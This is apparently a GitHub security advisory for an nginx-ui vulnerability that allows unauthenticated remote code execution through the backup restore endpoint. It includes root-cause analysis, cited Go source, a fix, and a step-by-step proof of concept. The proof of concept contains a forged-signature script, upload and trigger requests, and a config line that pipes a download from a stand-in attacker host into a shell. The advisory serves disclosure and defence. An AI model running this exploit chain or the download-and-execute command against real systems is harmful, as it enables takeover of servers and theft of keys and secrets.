# [C] Nginx-UI is Vulnerable to Unauthenticated Remote Code Execution via Backup Restore

## Summary
Severity: Critical
Advisory: GHSA-4pvg-prr3-9cxr
CVE: CVE-2026-42238
CWE: CWE-94
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-4pvg-prr3-9cxr
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/nginx-ui` — affected >=0 <2.3.8

## Details
**Product:** nginx-ui
**Repository:** `0xJacky/nginx-ui` (branch: `dev`)
**Vulnerability Class:** Authentication Bypass → Arbitrary File Write → OS Command Injection
**Affected Component:** `POST /api/restore`

---

## 1. Vulnerability Summary

nginx-ui exposes a backup restore endpoint (`POST /api/restore`) that is **completely unauthenticated** during the first 10 minutes after process startup on any fresh installation. An unauthenticated remote attacker can upload a crafted backup archive that overwrites the application's configuration file (`app.ini`) and SQLite database. Because the attacker controls the restored `app.ini`, they can inject an arbitrary OS command into the `TestConfigCmd` setting. After the application automatically restarts to apply the restored config, a single follow-up request triggers that command as the user running nginx-ui — typically `root` in Docker deployments.

The 10-minute unauthenticated window resets on every process restart, making this exploitable not only on initial deployments but on any restart event (container restart, upgrade, health-check-triggered restart).

---

## 2. Root Cause Analysis

### 2.1 The Restore Route Is Registered Without Authentication

`backup.InitRouter` is called on the `root` group, which carries only `IPWhiteList()` middleware — no `AuthRequired()`: [1](#2-0) 

The route definition: [2](#2-1) 

### 2.2 The `authIfInstalled` Guard Has a Time-Bounded Bypass

The only authentication guard on the restore route is `authIfInstalled`: [3](#2-2) 

It calls `AuthRequired()` only when `InstallLockStatus() || IsInstallTimeoutExceeded()` is true. Both conditions are false on a fresh install within the first 10 minutes: [4](#2-3) 

- `InstallLockStatus()` returns `false` because `JwtSecret` is `""` on a fresh install and `SkipInstallation` defaults to `false`.
- `IsInstallTimeoutExceeded()` returns `false` for the first 10 minutes after `startupTime` is set in `init()`.

When both are `false`, `authIfInstalled` calls `ctx.Next()` with **zero authentication**.

### 2.3 The `EncryptedForm` Middleware Is Not a Security Barrier

The `EncryptedForm()` middleware between `authIfInstalled` and `RestoreBackup` is **optional** — it only activates if the request includes an `encrypted_params` field. If that field is absent, it calls `c.Next()` immediately: [5](#2-4) 

An attacker sends a plain `multipart/form-data` request without `encrypted_params` and the middleware is a no-op.

### 2.4 The Attacker Controls the AES Key Used to Verify the Backup

The restore handler accepts the AES key and IV directly from the attacker via the `security_token` form field: [6](#2-5) 

The manifest integrity check derives its HMAC signing key **from the attacker-supplied AES key**: [7](#2-6) 

Since the attacker crafts the backup and supplies the key, they can produce a valid HMAC signature for any manifest content they choose. The integrity check is self-referential and provides no security against a crafted backup.

### 2.5 Restore Overwrites `app.ini` and the SQLite Database Unconditionally

When `restore_nginx_ui=true`, `restoreNginxUIConfig` directly copies files from the backup onto disk with no content validation: [8](#2-7) 

### 2.6 Restored `TestConfigCmd` Is Executed as a Shell Command

After restore, `risefront.Restart()` is called, reloading `app.ini`: [9](#2-8) 

On the next call to `TestConfig()`, the value of `TestConfigCmd` from the restored `app.ini` is passed verbatim to `/bin/sh -c`: [10](#2-9) [11](#2-10) 

---

## 3. Attack Prerequisites

| Requirement | Notes |
|---|---|
| Network access to nginx-ui port | Default: 9000/tcp |
| Target is a fresh install | `JwtSecret` is empty in `app.ini` |
| Within 10 minutes of last process start | Window resets on every restart |
| IP not blocked by `IPWhiteList` | Default config has no IP whitelist |

The 10-minute window is not a meaningful mitigation in practice. Docker containers restart frequently due to health checks, upgrades, and orchestrator rescheduling. Any restart resets `startupTime` via `init()`, reopening the window.

---

## 4. Step-by-Step Proof of Concept

### Step 1 — Confirm the installation window is open

```http
GET /api/install HTTP/1.1
Host: target:9000
```

Expected response confirming vulnerability:
```json
{"lock": false, "timeout": false}
```

### Step 2 — Craft the malicious backup

The backup format (derived from `internal/backup/backup.go`) is:

```
backup-TIMESTAMP.zip          ← outer ZIP (unencrypted)
├── manifest.json             ← JSON manifest
├── manifest.sig              ← HMAC-SHA256 of manifest.json
├── nginx-ui.zip              ← AES-CBC encrypted inner ZIP
└── nginx.zip                 ← AES-CBC encrypted inner ZIP
```

**2a.** Generate a random 32-byte AES key and 16-byte IV.

**2b.** Create the malicious `app.ini` to place inside `nginx-ui.zip`:

```ini
[app]
JwtSecret = attacker_chosen_jwt_secret_32chars

[node]
Secret = attacker_chosen_node_secret

[nginx]
TestConfigCmd = curl http://attacker.com/shell.sh|sh
```

**2c.** Create a SQLite database (`nginx-ui.db`) with a known bcrypt hash for the admin user (optional — the node secret alone grants full API access).

**2d.** Package `app.ini` and `nginx-ui.db` into `nginx-ui.zip`. Package an empty or minimal `nginx.zip`.

**2e.** Encrypt both ZIPs with AES-256-CBC using your key and IV.

**2f.** Compute SHA-256 hashes and sizes of the encrypted ZIPs. Build `manifest.json`:

```json
{
  "schema": 1,
  "created_at": "20260421-120000",
  "version": "2.0.0",
  "files": [
    {"name": "nginx-ui.zip", "sha256": "<hash>", "size": <size>},
    {"name": "nginx.zip",    "sha256": "<hash>", "size": <size>}
  ]
}
```

**2g.** Compute the HMAC-SHA256 signature of `manifest.json` using the signing key derived as:

```python
import hashlib, hmac
context = b"nginx-ui-backup-signing-v1:"
signing_key = hashlib.sha256(context + aes_key).digest()
sig = hmac.new(signing_key, manifest_bytes, hashlib.sha256).hexdigest()
```

**2h.** Assemble the outer ZIP containing `manifest.json`, `manifest.sig`, `nginx-ui.zip`, `nginx.zip`.

### Step 3 — Upload the malicious backup (no authentication required)

```http
POST /api/restore HTTP/1.1
Host: target:9000
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="backup_file"; filename="evil.zip"
Content-Type: application/zip

[crafted backup bytes]
------Boundary
Content-Disposition: form-data; name="security_token"

<base64(aes_key)>:<base64(aes_iv)>
------Boundary
Content-Disposition: form-data; name="restore_nginx_ui"

true
------Boundary--
```

Expected response (HTTP 200):
```json
{"nginx_ui_restored": true, "nginx_restored": false, "hash_match": true}
```

nginx-ui calls `risefront.Restart()` 2 seconds later, loading the attacker's `app.ini`.

### Step 4 — Trigger RCE using the restored node secret

After the restart (wait ~3 seconds):

```http
POST /api/nginx/test HTTP/1.1
Host: target:9000
X-Node-Secret: attacker_chosen_node_secret
```

nginx-ui executes:
```sh
/bin/sh -c "curl http://attacker.com/shell.sh|sh"
```

The attacker now has a reverse shell running as the nginx-ui process user (typically `root` in Docker).

---

## 5. Impact

- **Confidentiality:** Full read access to all nginx configurations, TLS private keys, database contents, and secrets stored in `app.ini`.
- **Integrity:** Arbitrary modification of all nginx configurations and nginx-ui application state.
- **Availability:** Complete denial of service; nginx and nginx-ui can be stopped or misconfigured.
- **Scope:** OS-level code execution. In Docker deployments (the primary distribution method), nginx-ui runs as root, giving the attacker full host access if the container has host mounts or privileged mode.

---

## 6. Affected Versions

All versions of nginx-ui where `authIfInstalled` is used as the sole authentication guard on `POST /api/restore`. The vulnerability is present in the current `dev` branch.

---

## 7. Recommended Fix

**Primary fix** — Require authentication unconditionally on the restore endpoint. The "allow restore during initial setup" design rationale does not justify unauthenticated access to a file-write primitive:

```go
// api/backup/router.go
func InitRouter(r *gin.RouterGroup) {
    r.GET("/backup", middleware.AuthRequired(), CreateBackup)
    r.POST("/restore", middleware.AuthRequired(), middleware.EncryptedForm(), RestoreBackup)
}
```

If restore-during-setup is a required feature, it should be gated on a one-time setup token generated at startup and printed to the server console (similar to how Jenkins handles initial setup), not on a time window.

**Secondary fix** — Validate the content of restored `app.ini` before writing it to disk. Specifically, `TestConfigCmd`, `ReloadCmd`, and `RestartCmd` should be rejected or stripped from any externally-supplied backup.

---

## 8. Timeline

| Date | Event |
|---|---|
| 2026-04-21 | Vulnerability identified via source code review |
| — | Vendor notification (pending) |
| — | CVE assignment (pending) |

### Citations

**File:** router/routers.go (L61-70)
```go
	root := r.Group("/api", middleware.IPWhiteList())
	{
		public.InitRouter(root)
		crypto.InitPublicRouter(root)
		user.InitAuthRouter(root)
		license.InitRouter(root)

		system.InitPublicRouter(root)
		system.InitSelfCheckRouter(root)
		backup.InitRouter(root)
```

**File:** api/backup/router.go (L9-16)
```go
// authIfInstalled requires auth if system is installed
func authIfInstalled(ctx *gin.Context) {
	if system.InstallLockStatus() || system.IsInstallTimeoutExceeded() {
		middleware.AuthRequired()(ctx)
	} else {
		ctx.Next()
	}
}
```

**File:** api/backup/router.go (L18-25)
```go
func InitRouter(r *gin.RouterGroup) {
	// Backup always requires authentication (contains sensitive data)
	r.GET("/backup", middleware.AuthRequired(), CreateBackup)

	// Restore requires auth only after installation
	// This allows restoring backup during initial setup
	r.POST("/restore", authIfInstalled, middleware.EncryptedForm(), RestoreBackup)
}
```

**File:** api/system/install.go (L27-34)
```go
func InstallLockStatus() bool {
	return settings.NodeSettings.SkipInstallation || cSettings.AppSettings.JwtSecret != ""
}

// IsInstallTimeoutExceeded checks if installation time limit (10 minutes) is exceeded
func IsInstallTimeoutExceeded() bool {
	return time.Since(startupTime) > 10*time.Minute
}
```

**File:** internal/middleware/encrypted_params.go (L69-75)
```go
		// Check if encrypted_params field exists
		encryptedParams := c.Request.FormValue("encrypted_params")
		if encryptedParams == "" {
			// No encryption, continue normally
			c.Next()
			return
		}
```

**File:** api/backup/restore.go (L35-70)
```go
	securityToken := c.PostForm("security_token") // Get concatenated key and IV
	// Get backup file
	backupFile, err := c.FormFile("backup_file")
	if err != nil {
		cosy.ErrHandler(c, cosy.WrapErrorWithParams(backup.ErrBackupFileNotFound, err.Error()))
		return
	}

	// Validate security token
	if securityToken == "" {
		cosy.ErrHandler(c, backup.ErrInvalidSecurityToken)
		return
	}

	// Split security token to get Key and IV
	parts := strings.Split(securityToken, ":")
	if len(parts) != 2 {
		cosy.ErrHandler(c, backup.ErrInvalidSecurityToken)
		return
	}

	aesKey := parts[0]
	aesIv := parts[1]

	// Decode Key and IV from base64
	key, err := base64.StdEncoding.DecodeString(aesKey)
	if err != nil {
		cosy.ErrHandler(c, cosy.WrapErrorWithParams(backup.ErrInvalidAESKey, err.Error()))
		return
	}

	iv, err := base64.StdEncoding.DecodeString(aesIv)
	if err != nil {
		cosy.ErrHandler(c, cosy.WrapErrorWithParams(backup.ErrInvalidAESIV, err.Error()))
		return
	}
```

**File:** api/backup/restore.go (L126-132)
```go
	if restoreNginxUI {
		go func() {
			time.Sleep(2 * time.Second)
			// gracefully restart
			risefront.Restart()
		}()
	}
```

**File:** internal/backup/manifest.go (L156-163)
```go
func deriveBackupSigningKeyFromAESKey(aesKey []byte) ([]byte, error) {
	if len(aesKey) == 0 {
		return nil, ErrInvalidAESKey
	}

	sum := sha256.Sum256(append([]byte(manifestKeyContext), aesKey...))
	return sum[:], nil
}
```

**File:** internal/backup/restore.go (L458-484)
```go
// restoreNginxUIConfig restores nginx-ui configuration files
func restoreNginxUIConfig(nginxUIBackupDir string) error {
	// Get config directory
	configDir := filepath.Dir(cosysettings.ConfPath)
	if configDir == "" {
		return ErrConfigPathEmpty
	}

	// Restore app.ini to the configured location
	srcConfigPath := filepath.Join(nginxUIBackupDir, "app.ini")
	if err := copyFile(srcConfigPath, cosysettings.ConfPath); err != nil {
		return err
	}

	// Restore database file if exists
	dbName := settings.DatabaseSettings.GetName()
	srcDBPath := filepath.Join(nginxUIBackupDir, dbName+".db")
	destDBPath := filepath.Join(configDir, dbName+".db")

	// Only attempt to copy if database file exists in backup
	if _, err := os.Stat(srcDBPath); err == nil {
		if err := copyFile(srcDBPath, destDBPath); err != nil {
			return err
		}
	}

	return nil
```

**File:** internal/nginx/nginx.go (L25-36)
```go
func TestConfig() (stdOut string, stdErr error) {
	mutex.Lock()
	defer mutex.Unlock()
	if settings.NginxSettings.TestConfigCmd != "" {
		return execShell(settings.NginxSettings.TestConfigCmd)
	}
	sbin := GetSbinPath()
	if sbin == "" {
		return execCommand("nginx", "-t")
	}
	return execCommand(sbin, "-t")
}
```

**File:** internal/nginx/exec.go (L12-28)
```go
func execShell(cmd string) (stdOut string, stdErr error) {
	var execCmd *exec.Cmd

	if runtime.GOOS == "windows" {
		execCmd = exec.Command("cmd", "/c", cmd)
	} else {
		execCmd = exec.Command("/bin/sh", "-c", cmd)
	}

	execCmd.Dir = GetNginxExeDir()
	bytes, err := execCmd.CombinedOutput()
	stdOut = string(bytes)
	if err != nil {
		stdErr = err
	}
	return
}
```

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-4pvg-prr3-9cxr
- https://nvd.nist.gov/vuln/detail/CVE-2026-42238
- https://github.com/0xJacky/nginx-ui
- https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.8
